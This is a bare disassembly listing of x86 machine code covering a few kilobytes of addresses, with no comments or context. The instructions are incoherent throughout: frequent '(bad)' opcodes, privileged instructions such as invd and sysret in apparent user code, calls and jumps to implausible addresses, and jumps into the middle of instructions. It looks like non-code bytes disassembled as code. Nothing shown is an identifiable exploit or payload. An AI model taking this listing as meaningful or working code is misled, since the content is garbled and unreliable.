  43253c:	mov    esp,esp
  43253e:	hlt    
  43253f:	test   DWORD PTR [ebp-0x8],esi
  432542:	mov    eax,DWORD PTR [ebp-0x14]
  432545:	xor    ecx,DWORD PTR [ebx-0x76478864]
  43254b:	dec    edi
  43254c:	or     BYTE PTR [eax],al
  43254e:	jne    0x4324d9
  432550:	mov    esi,esp
  432552:	call   0x77a9b117
  432557:	inc    ebp
  432558:	mov    DWORD PTR [eax+0x9b4f0c],edi
  43255e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432564:	add    BYTE PTR [esi+0x7d],ah
  432567:	inc    ebp
  432568:	mov    bx,WORD PTR [ebp+0x8]
  43256c:	add    DWORD PTR [ebp+0x54],0x30c008b
  432573:	inc    ebp
  432574:	mov    bx,di
  432577:	lock test BYTE PTR [ecx+0x7000801],bh
  43257e:	jge    0x432541
  432580:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432586:	cli    
  432587:	xor    bl,bh
  432589:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43258f:	test   BYTE PTR [eax],cl
  432591:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432598:	cmp    ebp,eax
  43259a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4325a1:	test   BYTE PTR [ebp+0x1],bh
  4325a4:	mov    ebx,0x458a00
  4325a9:	xor    esi,DWORD PTR [ebx]
  4325ab:	add    esp,DWORD PTR [esi-0x77]
  4325ae:	pop    ebp
  4325af:	loopne 0x432617
  4325b1:	inc    ebp
  4325b2:	clc    
  4325b3:	xor    edi,DWORD PTR [ebx]
  4325b5:	add    esi,DWORD PTR [edx-0x77]
  4325b8:	data16 fdivr QWORD PTR [ebp-0x49]
  4325bc:	mov    ebx,0xb78afc
  4325c1:	hlt    
  4325c2:	xor    edi,DWORD PTR [esi+eiz*2]
  4325c5:	add    BYTE PTR [ebp+0x66],bl
  4325c8:	data16 lock clc 
  4325cb:	cmp    al,0x3b
  4325cd:	add    BYTE PTR [edi+0x66],dh
  4325d0:	psubq  mm7,QWORD PTR [ebp+0x2]
  4325d4:	ltr    WORD PTR [ebp+0x66]
  4325d8:	add    esi,eax
  4325da:	add    di,WORD PTR [ebp+0x2b]
  4325de:	data16 data16 jge 0x43265f
  4325e2:	mov    ebx,0xe08a8b
  4325e7:	jge    0x43261c
  4325e9:	data16 data16 xor al,0x5d
  4325ed:	data16 data16 jne 0x4325e9
  4325f1:	mov    edi,DWORD PTR [ebx]
  4325f3:	fdiv   QWORD PTR [edx+0x7d]
  4325f6:	data16 data16 jge 0x43262e
  4325fa:	mov    ebx,0x758a66
  4325ff:	mov    esi,0x667233
  432604:	pop    ebp
  432605:	or     BYTE PTR [esi+0x0],ah
  432608:	clc    
  432609:	mov    edi,DWORD PTR [ebx]
  43260b:	lock ja 0x432599
  43260e:	(bad)  
  432610:	jge    0x432609
  432612:	invd   
  432614:	pop    ebp
  432615:	add    BYTE PTR [ebx],al
  432617:	(bad)  
  432618:	cmp    di,WORD PTR [ebp+0xf]
  43261c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  432620:	mov    bx,WORD PTR [ebp-0x10]
  432624:	pop    bp
  432626:	fbstp  TBYTE PTR [ebx]
  432628:	test   DWORD PTR [ebx],eax
  43262a:	add    BYTE PTR [ebx],bh
  43262c:	add    BYTE PTR [esi+0x7d],ah
  43262f:	jge    0x4325bc
  432631:	data16 in al,dx
  432633:	pop    ebp
  432634:	stc    
  432635:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  43263c:	mov    edi,ebx
  43263e:	in     al,dx
  43263f:	test   BYTE PTR [ebp+0x0],bh
  432642:	mov    eax,DWORD PTR [eax]
  432644:	call   0xbd401fd4
  432649:	cmp    al,0x9b
  43264b:	add    BYTE PTR [edx],dh
  43264d:	mov    bx,di
  432650:	call   0x8b4ba3e0
  432655:	add    ebp,esp
  432657:	mov    bx,di
  43265a:	jnp    0x432682
  43265c:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  432662:	mov    eax,DWORD PTR [eax]
  432664:	call   0x7c3eb1cf
  432669:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  43266f:	data16 data16 fistp WORD PTR [ebp+0xe]
  432674:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  43267e:	fisttp WORD PTR [ecx-0x7401f77b]
  432684:	(bad)  
  432685:	cld    
  432686:	jne    0x4326c4
  432688:	xor    eax,DWORD PTR [eax]
  43268a:	mov    esp,DWORD PTR [esi-0x10]
  43268d:	sti    
  43268e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432695:	data16 adc bl,bh
  432698:	push   ebp
  432699:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  4326a0:	mov    WORD PTR [eax],es
  4326a2:	fwait
  4326a3:	data16 xor bh,bl
  4326a6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4326ac:	mov    esp,DWORD PTR [esi-0x14]
  4326af:	fisttp WORD PTR [ebx-0x3748a9f2]
  4326b5:	or     al,0x2b
  4326b7:	mov    bh,0xba
  4326b9:	hlt    
  4326ba:	mov    bh,bl
  4326bc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4326c2:	dec    esi
  4326c3:	or     al,0x0
  4326c5:	mov    edi,DWORD PTR [ebx]
  4326c7:	or     BYTE PTR [ebp+0x3b],dh
  4326ca:	mov    ecx,DWORD PTR [edi]
  4326cc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4326d2:	xor    al,0xd8
  4326d4:	pop    bp
  4326d6:	lock xor esi,DWORD PTR [ebx]
  4326d9:	lea    esp,[esi+0x1f]
  4326dc:	icebp  
  4326dd:	jb     0x4326e3
  4326df:	add    al,al
  4326e1:	jge    0x4326ef
  4326e3:	mov    eax,eax
  4326e5:	fsubr  st,st(3)
  4326e7:	pop    ebp
  4326e8:	mov    esi,DWORD PTR [ebx]
  4326ea:	in     al,0x8d
  4326ec:	rcr    DWORD PTR [edi],0xc2
  4326ef:	jb     0x43274f
  4326f1:	add    cl,cl
  4326f3:	jge    0x432701
  4326f5:	mov    edx,DWORD PTR [ebp-0x20]
  4326f8:	in     al,dx
  4326f9:	pop    ebp
  4326fa:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4326ff:	cmp    di,WORD PTR [ebp+0x0]
  432703:	mov    ebp,DWORD PTR [ebx]
  432705:	fdivr  QWORD PTR [esi+0x668a5d]
  43270b:	cmp    al,0x33
  43270d:	mov    si,0x4e7d
  432711:	mov    eax,DWORD PTR [eax]
  432713:	lock inc ebp
  432715:	mov    esi,DWORD PTR [eax]
  432717:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43271e:	clc    
  43271f:	(bad)  
  432720:	cmp    edi,DWORD PTR [ebx]
  432722:	je     0x432733
  432724:	push   ebx
  432725:	loopne 0x432736
  432727:	dec    ecx
  432729:	mov    esp,DWORD PTR [ebp-0x1c]
  43272c:	int    0xf1
  43272e:	mov    esi,0x703084d
  432733:	pcmpgtd mm6,mm1
  432736:	add    BYTE PTR [ebp+0x66],dh
  432739:	jmp    0x432706
  43273b:	mov    eax,DWORD PTR [ebx]
  43273d:	lock push ebp
  43273f:	ror    DWORD PTR [ebp-0x2972feb3],1
  432745:	or     bh,dl
  432747:	jb     0x432747
  432749:	add    BYTE PTR [ebx-0x1a7487b3],cl
  43274f:	loopne 0x432751
  432751:	jne    0x432755
  432753:	data16 add BYTE PTR [esi+eiz*2],dh
  432757:	mov    ecx,ebx
  432759:	data16 cmp al,0xf1
  43275c:	add    BYTE PTR [esi+eiz*2],bh
  43275f:	add    bl,cl
  432761:	retw   0xf2
  432765:	ret    0x66
  432768:	retf   
  432769:	enterw 0x4df1,0x19
  43276e:	pop    edi
  43276f:	jne    0x4326f2
  432771:	mov    esi,DWORD PTR [eax]
  432773:	call   0x77b7b314
  432778:	xor    ebp,DWORD PTR [ebx]
  43277a:	lea    esp,[esi+0x48]
  43277d:	repnz in eax,0x3b
  432780:	add    BYTE PTR [ebp-0x37],dh
  432783:	xor    edx,DWORD PTR [ebp-0x15]
  432786:	in     al,dx
  432787:	xor    edx,DWORD PTR [esi+0x40]
  43278a:	mov    DWORD PTR [edi],0x338545fc
  432790:	clc    
  432791:	add    esi,DWORD PTR [ecx]
  432793:	pop    edi
  432794:	pushf  
  432795:	pop    ebx
  432796:	call   0xff44275d
  43279b:	mov    edi,eax
  43279d:	push   ecx
  43279e:	pop    es
  43279f:	mov    edi,DWORD PTR [eax]
  4327a1:	push   esi
  4327a2:	inc    esi
  4327a3:	add    bh,BYTE PTR [esi+0x0]
  4327a6:	popa   
  4327a7:	data16 (bad) 
  4327a9:	into   
  4327aa:	gs cmp al,0xcd
  4327ad:	add    BYTE PTR [ecx+0x7ce0866],bh
  4327b3:	ret    0x66
  4327b6:	add    bh,al
  4327b8:	add    bh,ah
  4327ba:	add    BYTE PTR [ebp+0x31c3f866],al
  4327c0:	cmp    al,0x9c
  4327c2:	add    BYTE PTR [esi+0x66],ah
  4327c5:	into   
  4327c6:	ret    
  4327c7:	pop    ebp
  4327c8:	adc    BYTE PTR [edi+0x0],dl
  4327cb:	mov    bh,0x66
  4327cd:	mov    edi,0xff038dc3
  4327d2:	jne    0x432828
  4327d4:	lea    edx,[ecx+0x1]
  4327d7:	mov    ebx,0xd64ff1
  4327dc:	sar    DWORD PTR [ebx],1
  4327de:	test   BYTE PTR [ebp+0x36],dh
  4327e1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4327e5:	push   edi
  4327e6:	xor    BYTE PTR [ebx],0x38
  4327e9:	mov    esi,ebx
  4327eb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  4327f1:	ss inc ebp
  4327f3:	fs pop ebx
  4327f5:	mov    ebx,0x9c3b30
  4327fa:	je     0x432827
  4327fc:	xor    edi,DWORD PTR [ebx+0x668a33]
  432802:	mov    WORD PTR [ebx],?
  432804:	ss mov ebx,0x8b4e64
  43280a:	pop    edi
  43280b:	cmp    ecx,ecx
  43280d:	jne    0x432864
  43280f:	mov    ebp,esp
  432811:	cld    
  432812:	push   esi
  432813:	pop    ebx
  432814:	inc    ebp
  432815:	stc    
  432816:	xor    BYTE PTR [ebp+0x9bef89c],al
  43281c:	test   esi,ecx
  43281e:	clc    
  43281f:	test   dl,dl
  432821:	cmp    bh,bh
  432823:	fs pop si
  432826:	or     bl,al
  432828:	add    cl,BYTE PTR [ebx+0x57665100]
  43282e:	retf   0x3c45
  432831:	xor    BYTE PTR [eax],al
  432833:	pushf  
  432834:	mov    si,0x85ca
  432838:	ret    0xf8
  43283b:	pop    ebx
  43283c:	dec    dx
  43283f:	mov    edx,DWORD PTR [edi-0x76]
  432842:	push   edi
  432843:	add    al,0xb7
  432845:	xor    al,0xba
  432847:	cmp    al,0x8d
  432849:	je     0x43284a
  43284b:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  43284f:	lea    edi,[ebx+0x544fff]
  432855:	push   ecx
  432856:	cmp    edx,DWORD PTR [ebx+0x75]
  432859:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  43285f:	add    BYTE PTR [ebx],dh
  432861:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  432867:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  43286e:	mov    ebx,0x3b3b00
  432873:	jne    0x4328a0
  432875:	mov    DWORD PTR [ebx+0x728afc],edi
  43287b:	xor    esi,DWORD PTR [ebx]
  43287d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432883:	push   edi
  432884:	cmp    esp,ebp
  432886:	jne    0x432888
  432888:	sbb    DWORD PTR [eax],0x8085c3fc
  43288e:	clc    
  43288f:	inc    esi
  432890:	pop    ebx
  432891:	sti    
  432892:	add    eax,0xeb8bc075
  432897:	cld    
  432898:	xor    edi,DWORD PTR ds:0xf8c3855e
  43289e:	mov    ecx,DWORD PTR [ecx+edx*2]
  4328a1:	rol    DWORD PTR [ebp-0x37],0xf
  4328a5:	mov    DWORD PTR [eax],ecx
  4328a7:	inc    edi
  4328a8:	(bad)  
  4328a9:	in     eax,0xfe
  4328ab:	add    bh,bh
  4328ad:	(bad)  
  4328ae:	mov    esi,0xc38a5e
  4328b3:	mov    esi,DWORD PTR [ebx]
  4328b5:	push   ecx
  4328b6:	mov    edi,0xfc4ec7
  4328bb:	test   DWORD PTR [ebp-0x8],edx
  4328be:	xor    di,ax
  4328c1:	pushf  
  4328c2:	sub    ebp,eax
  4328c4:	inc    ebp
  4328c5:	(bad)  
  4328c6:	sub    edi,edi
  4328c8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4328ce:	inc    ebp
  4328cf:	add    BYTE PTR [esi+0x2b],ah
  4328d2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4328d8:	cmp    al,0x33
  4328da:	mov    edi,DWORD PTR [edx+0xfe4e81]
  4328e0:	(bad)  
  4328e1:	cmp    esi,DWORD PTR [ebx]
  4328e3:	je     0x43289d
  4328e5:	push   ebx
  4328e6:	dec    esi
  4328e7:	str    ecx
  4328ea:	cmp    esp,DWORD PTR [ebp+0x75]
  4328ed:	int    0x33
  4328ef:	mov    edi,0x789085f
  4328f4:	mov    edx,DWORD PTR [eax]
  4328f6:	cld    
  4328f7:	add    cl,cl
  4328f9:	data16 add al,0xcb
  4328fc:	push   ebp
  4328fd:	add    ebp,esp
  4328ff:	jne    0x4328ed
  432901:	(bad)  
  432902:	mov    DWORD PTR [ecx],0xd685f7ec
  432908:	clc    
  432909:	xlat   BYTE PTR ds:[ebx]
  43290a:	inc    ebp
  43290b:	mov    esi,DWORD PTR [edx]
  43290d:	push   eax
  43290e:	pushf  
  43290f:	in     eax,0x8b
  432911:	add    ah,ch
  432913:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432917:	add    ax,0x72cb
  43291b:	cmp    al,0x0
  43291d:	add    BYTE PTR [ebp+0x66],al
  432920:	(bad)  
  432921:	retf   
  432922:	lock ret 0x85
  432926:	clc    
  432927:	inc    bp
  432929:	retf   
  43292a:	cmp    eax,0xc77d9cc8
  43292f:	xor    ah,bh
  432931:	pushf  
  432932:	test   DWORD PTR [edi-0x8],ebx
  432935:	je     0x43297c
  432937:	xor    esi,DWORD PTR ds:0x7020840
  43293d:	ror    BYTE PTR [ebp-0x37],0x8d
  432941:	push   ebp
  432942:	add    esp,ebp
  432944:	jb     0x4328d1
  432946:	add    BYTE PTR [eax],cl
  432948:	dec    ebp
  432949:	mov    bh,0x81
  43294b:	push   esi
  43294c:	push   esp
  43294d:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  432954:	xor    al,BYTE PTR [eax]
  432956:	mov    edx,DWORD PTR [edi+0x10]
  432959:	(bad)  
  43295a:	scas   eax,DWORD PTR es:[edi]
  43295b:	ret    0x3b
  43295e:	jns    0x3b442651
  432964:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  432968:	dec    ebp
  432969:	or     BYTE PTR [ebx],ch
  43296b:	ret    0x458b
  43296e:	lock jmp 0x432962
  432971:	mov    ecx,DWORD PTR [eax]
  432973:	or     BYTE PTR [edi],al
  432975:	mov    ecx,eax
  432977:	xor    DWORD PTR [edx+0x2],0x0
  43297b:	mov    bh,0xc1
  43297d:	adc    BYTE PTR [eax],dh
  43297f:	iret   
  432980:	inc    ebp
  432981:	mov    DWORD PTR [ebx],0x4dfff8c4
  432987:	inc    BYTE PTR [ebx]
  432989:	ret    0xf8
  43298c:	adc    DWORD PTR [esi+0x10],esp
  43298f:	clc    
  432990:	dec    ecx
  432991:	fisttp WORD PTR [ecx+0x456604c0]
  432997:	add    dh,BYTE PTR ds:0x75e0845
  43299d:	ret    0x4d
  4329a0:	lea    ecx,[ebx+0x18728301]
  4329a6:	add    BYTE PTR [ebp+0x45],al
  4329a9:	xor    ecx,ebp
  4329ab:	pushf  
  4329ac:	add    bh,al
  4329ae:	add    al,ch
  4329b0:	inc    ebp
  4329b1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4329b7:	xor    eax,0x781084d
  4329bc:	push   esp
  4329bd:	fwait
  4329be:	push   ecx
  4329bf:	xor    al,BYTE PTR [ecx+0x32f89b89]
  4329c5:	inc    ebp
  4329c6:	cmp    edi,DWORD PTR [ecx]
  4329c8:	jbe    0x432966
  4329ca:	mov    eax,edi
  4329cc:	or     ah,dh
  4329ce:	inc    ebp
  4329cf:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4329d5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4329db:	in     al,dx
  4329dc:	hlt    
  4329dd:	push   esp
  4329de:	push   esp
  4329df:	push   ecx
  4329e0:	push   ecx
  4329e1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4329e7:	fwait
  4329e8:	fwait
  4329e9:	xor    dh,BYTE PTR [edx]
  4329eb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4329f1:	or     BYTE PTR [ebp+0x7],al
  4329f4:	mov    eax,ecx
  4329f6:	clc    
  4329f7:	jb     0x4329ba
  4329f9:	add    BYTE PTR [ebp+0x55],cl
  4329fc:	or     DWORD PTR [edi],0xc251d154
  432a02:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  432a0c:	mov    edi,eax
  432a0e:	or     cl,al
  432a10:	inc    ebp
  432a11:	dec    ebp
  432a12:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432a18:	or     WORD PTR [ecx],0x899b
  432a1d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  432a23:	mov    edx,DWORD PTR [ecx+0x8]
  432a26:	mov    eax,DWORD PTR [ebp-0x8]
  432a29:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  432a30:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  432a36:	inc    ebp
  432a37:	dec    eax
  432a38:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  432a3e:	add    edx,DWORD PTR [ecx-0x8]
  432a41:	mov    ecx,DWORD PTR [ecx]
  432a43:	clc    
  432a44:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  432a4b:	mov    ecx,ebp
  432a4d:	clc    
  432a4e:	(bad)  
  432a4f:	popf   
  432a50:	inc    DWORD PTR [eax]
  432a52:	ret    0x8b
  432a55:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  432a5b:	mov    edi,esp
  432a5d:	hlt    
  432a5e:	test   ecx,esi
  432a60:	clc    
  432a61:	or     BYTE PTR [ebp+0x7],al
  432a64:	xor    al,cl
  432a66:	pushf  
  432a67:	jb     0x432a9c
  432a69:	add    BYTE PTR [eax-0x3f],al
  432a6c:	inc    eax
  432a6d:	daa    
  432a6e:	inc    ebp
  432a6f:	inc    ebp
  432a70:	xor    eax,0x7f80803
  432a75:	dec    ebp
  432a76:	fwait
  432a77:	add    esi,DWORD PTR [edx]
  432a79:	clc    
  432a7a:	cmp    DWORD PTR [ecx],ecx
  432a7c:	or     al,0x8
  432a7e:	add    al,BYTE PTR [ebp+0x2c]
  432a81:	xor    eax,0x7350845
  432a86:	or     BYTE PTR [ebp+0x7],cl
  432a89:	lea    ebx,[ebx-0x748dcdff]
  432a8f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432a96:	mov    edx,DWORD PTR [eax]
  432a98:	cld    
  432a99:	dec    ebp
  432a9a:	push   esp
  432a9b:	sub    edx,DWORD PTR [ecx-0x75]
  432a9e:	add    eax,0xf172fc
  432aa3:	or     BYTE PTR [ebp+0x7],cl
  432aa6:	add    eax,ecx
  432aa8:	or     al,0x72
  432aaa:	add    DWORD PTR [eax],eax
  432aac:	mov    ebx,0x29c2c1
  432ab1:	inc    ebp
  432ab2:	mov    eax,DWORD PTR [ebx]
  432ab4:	cmp    eax,0x3004d1c
  432aba:	xbegin 0x66c8b6b4
  432ac0:	clc    
  432ac1:	or     BYTE PTR [ebp+0x45],al
  432ac4:	xor    dh,BYTE PTR ds:0x78b089c
  432aca:	adc    BYTE PTR [ebp+0x45],cl
  432acd:	lea    eax,[ebp+0x33727501]
  432ad3:	add    cl,ch
  432ad5:	inc    ebp
  432ad6:	add    bl,ch
  432ad8:	add    BYTE PTR [ebx+0x45850845],cl
  432ade:	je     0x432a6b
  432ae0:	push   ebx
  432ae1:	or     al,0x85
  432ae3:	dec    ebp
  432ae4:	std    
  432ae5:	mov    bh,bh
  432ae7:	mov    BYTE PTR [ebp-0x75],al
  432aea:	mov    edi,eax
  432aec:	or     al,0x89
  432aee:	inc    ebp
  432aef:	clc    
  432af0:	mov    esp,esp
  432af2:	hlt    
  432af3:	call   DWORD PTR [edi-0x37]
  432af6:	push   esp
  432af7:	or     al,0x51
  432af9:	push   ebp
  432afa:	xor    ebp,esp
  432afc:	mov    esi,0x457251
  432b01:	xor    esi,eax
  432b03:	pushf  
  432b04:	inc    ebp
  432b05:	(bad)  
  432b06:	mov    edi,eax
  432b08:	or     al,0x85
  432b0a:	add    al,bh
  432b0c:	inc    eax
  432b0e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432b12:	or     ah,bh
  432b14:	inc    eax
  432b15:	push   esp
  432b16:	jmp    0x432b69
  432b18:	mov    eax,DWORD PTR ds:0xe8720c
  432b1e:	mov    DWORD PTR [ebp-0x8],eax
  432b21:	jne    0x432b68
  432b23:	jmp    0x432ab0
  432b25:	mov    ebp,DWORD PTR [eax]
  432b27:	clc    
  432b28:	retf   0xff54
  432b2b:	push   ecx
  432b2c:	mov    DWORD PTR ds:0x757210,eax
  432b32:	mov    ecx,DWORD PTR [ebp-0x4]
  432b35:	sub    esp,DWORD PTR [ebx-0x77]
  432b38:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432b3f:	or     ah,bh
  432b41:	pop    es
  432b42:	ds fwait
  432b44:	push   DWORD PTR [edx]
  432b46:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  432b4c:	(bad)  
  432b4d:	mov    bh,bh
  432b4f:	jmp    0x432b3d
  432b51:	leave  
  432b52:	jne    0x432b5c
  432b54:	call   0x3024ae
  432b59:	in     al,dx
  432b5a:	dec    ebp
  432b5b:	add    dh,BYTE PTR [ebx]
  432b5d:	add    BYTE PTR [ebx],al
  432b5f:	inc    ebp
  432b60:	cmp    esi,DWORD PTR [ecx]
  432b62:	je     0x432b00
  432b64:	mov    eax,edi
  432b66:	or     al,0xf0
  432b68:	add    BYTE PTR [ebp+0x458bf845],al
  432b6e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432b74:	adc    al,0x7
  432b76:	enter  0x9fc0,0xa5
  432b7a:	rol    BYTE PTR [eax],0x5e
  432b7d:	mov    ecx,ecx
  432b7f:	or     al,0xc
  432b81:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432b88:	jmp    0x432b89
  432b8a:	push   ebp
  432b8b:	mov    esp,ebp
  432b8d:	cld    
  432b8e:	inc    ebp
  432b8f:	inc    ebp
  432b90:	or     DWORD PTR [ecx+0x457dec10],0x0
  432b97:	push   esi
  432b98:	push   esi
  432b99:	mov    edi,0x7af080f
  432b9e:	add    bh,al
  432ba0:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432ba6:	add    BYTE PTR [ecx+0x4540100f],cl
  432bac:	mov    ebp,eax
  432bae:	mov    ebp,edi
  432bb0:	lock call edx
  432bb3:	fcom   DWORD PTR [ebp+0x45]
  432bb6:	mov    eax,0x148a8b
  432bbb:	push   ecx
  432bbc:	enter  0xc145,0x83
  432bc0:	cmp    ecx,DWORD PTR [eax]
  432bc2:	add    BYTE PTR [ebp+0x4d],al
  432bc5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432bcb:	call   0xffa3273a
  432bd0:	cmp    eax,DWORD PTR [ebp-0xc]
  432bd3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432bd7:	push   ebp
  432bd8:	(bad)  
  432bd9:	call   0x3429dd
  432bde:	mov    bh,0xdb
  432be0:	cld    
  432be1:	or     BYTE PTR [ebp+0x45],bl
  432be4:	(bad)  
  432be5:	call   0xff7d2875
  432bea:	add    al,BYTE PTR [ebp+0x37]
  432bed:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432bf3:	jne    0x432bf5
  432bf5:	(bad)  
  432bf6:	cmp    edi,esp
  432bf8:	jne    0x432c2b
  432bfa:	mov    edi,edi
  432bfc:	or     BYTE PTR [ebx-0x307f0b49],cl
  432c02:	pop    ds
  432c03:	into   
  432c04:	je     0x432bc7
  432c06:	mov    ebx,DWORD PTR [esi]
  432c08:	or     BYTE PTR [ebp-0x49],al
  432c0b:	mov    esp,DWORD PTR [esi-0x77]
  432c0e:	mov    esi,0x2451f0c
  432c13:	mov    eax,DWORD PTR [eax]
  432c15:	or     al,0x66
  432c17:	sar    bl,0x3b
  432c1a:	xor    esi,DWORD PTR [ebp+0x66]
  432c1d:	xor    ecx,edi
  432c1f:	pop    edi
  432c20:	adc    bl,BYTE PTR [ebx+0x7e]
  432c23:	ret    0xff
  432c26:	cld    
  432c27:	inc    ebp
  432c28:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432c2e:	cld    
  432c2f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432c36:	push   0xffffff83
  432c38:	pop    edi
  432c39:	or     BYTE PTR [ebp+0x53],dh
  432c3c:	xorps  xmm1,xmm2
  432c3f:	test   BYTE PTR [eax+eax*1],bh
  432c42:	add    BYTE PTR [eax],al
  432c44:	adc    eax,eax
  432c46:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432c4e:	jmp    DWORD PTR [eax]
  432c50:	ror    al,0x5e
  432c53:	inc    ebp
  432c54:	leave  
  432c55:	xor    ecx,DWORD PTR [eax]
  432c57:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432c5d:	add    ah,al
  432c5f:	xor    edi,edi
  432c61:	xor    DWORD PTR [ebx],0x66003302
  432c67:	mov    DWORD PTR [ebp-0xc],ecx
  432c6a:	pcmpgtw mm0,mm0
  432c6d:	add    dl,ah
  432c6f:	leave  
  432c70:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432c74:	push   eax
  432c75:	dec    ebp
  432c76:	mov    esi,DWORD PTR [ebx-0x75]
  432c79:	lea    ebp,[eax-0x7c00ff02]
  432c7f:	xor    eax,DWORD PTR [eax]
  432c81:	sysret 
  432c83:	dec    ebp
  432c84:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432c8b:	push   WORD PTR [ecx+0x8]
  432c8f:	jne    0x432c52
  432c91:	ud0    ecx,DWORD PTR [ecx]
  432c94:	mov    eax,edx
  432c96:	lods   al,BYTE PTR ds:[esi]
  432c97:	add    BYTE PTR [eax],al
  432c99:	data16 (bad) 
  432c9b:	iret   
  432c9c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432ca3:	cli    
  432ca4:	inc    ebp
  432ca5:	cmp    al,0x8d
  432ca7:	add    BYTE PTR [esi+0x2d],ah
  432caa:	inc    ebp
  432cab:	pop    ebp
  432cac:	lea    ecx,[edi]
  432cae:	mov    dl,bh
  432cb0:	add    BYTE PTR [edi],cl
  432cb2:	mov    DWORD PTR [eax+eax*8],edi
  432cb5:	mov    ebx,0x3b87
  432cba:	add    BYTE PTR [ebx],ch
  432cbc:	inc    ebp
  432cbd:	data16 (bad) 
  432cbf:	clc    
  432cc0:	int3   
  432cc1:	cmp    eax,DWORD PTR [eax]
  432cc3:	je     0x432c4e
  432cc5:	push   0xffffffc8
  432cc7:	pop    edi
  432cc8:	xchg   DWORD PTR [ebp+0x0],eax
  432ccb:	data16 add BYTE PTR [ebp+0x45],cl
  432ccf:	lea    cx,[ebp+0x10]
  432cd3:	jb     0x432cd5
  432cd5:	jmp    0x432c60
  432cd7:	call   eax
  432cd9:	clc    
  432cda:	xchg   DWORD PTR [edi+0x1],edi
  432cdd:	mov    eax,DWORD PTR [eax]
  432cdf:	or     BYTE PTR [ebp-0x49],al
  432ce2:	lea    eax,[eax+0x74003154]
  432ce8:	push   edi
  432ce9:	inc    edx
  432cea:	jge    0x432ceb
  432cec:	mov    DWORD PTR [edi],ecx
  432cee:	fdiv   DWORD PTR [edi-0x6]
  432cf1:	inc    DWORD PTR [eax]
  432cf3:	xor    edx,DWORD PTR [eax+0x5f]
  432cf6:	xchg   DWORD PTR [ebx+0x1],ebx
  432cf9:	ret    0x0
  432cfc:	xor    BYTE PTR [ebp-0x51],cl
  432cff:	cmp    edi,0xf0ff89fe
  432d05:	data16 ror al,0x84
  432d09:	rol    BYTE PTR [eax],0x3b
  432d0c:	add    al,dh
  432d0e:	dec    eax
  432d0f:	xchg   esp,eax
  432d10:	push   ebx
  432d11:	jmp    0x432c9e
  432d13:	push   ebp
  432d14:	add    esp,ebp
  432d16:	add    ebp,esp
  432d18:	mov    edx,DWORD PTR [edi+0x24]
  432d1b:	clc    
  432d1c:	dec    esi
  432d1d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432d23:	cmp    BYTE PTR [ebx],al
  432d25:	jne    0x432cb0
  432d27:	xor    esp,eax
  432d29:	jmp    0x462eac
  432d2e:	add    ebp,DWORD PTR [ecx+ecx*4]
  432d31:	jne    0x432d27
  432d33:	call   0xffcd2a8d
  432d38:	clc    
  432d39:	xchg   edi,eax
  432d3a:	sti    
  432d3b:	add    DWORD PTR [ebx],eax
  432d3d:	add    BYTE PTR [ebp+0x47],bl
  432d40:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432d46:	pop    ebp
  432d47:	mov    DWORD PTR [esi-0x48],esi
  432d4a:	jmp    0x432d93
  432d4c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432d52:	(bad)  
  432d54:	cmp    al,0x0
  432d56:	cmp    eax,DWORD PTR [ebp+0x18]
